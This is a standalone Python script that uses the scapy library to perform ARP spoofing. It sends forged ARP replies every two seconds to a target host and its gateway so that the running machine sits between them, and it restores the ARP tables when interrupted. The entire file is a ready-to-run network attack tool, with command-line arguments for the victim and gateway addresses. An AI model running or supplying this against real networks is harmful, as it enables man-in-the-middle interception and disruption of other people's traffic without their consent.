#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Use to specify the target IP.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Use to specify the gateway IP.")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify the target IP, Use --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify the gateway IP, Use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc =spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = options.target_ip
gateway = options.gateway_ip
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway)
        spoof(gateway, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: "+str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C......Resetting ARP Tables......Please Wait.\n")
    restore(target_ip, gateway)
    restore(gateway, target_ip)
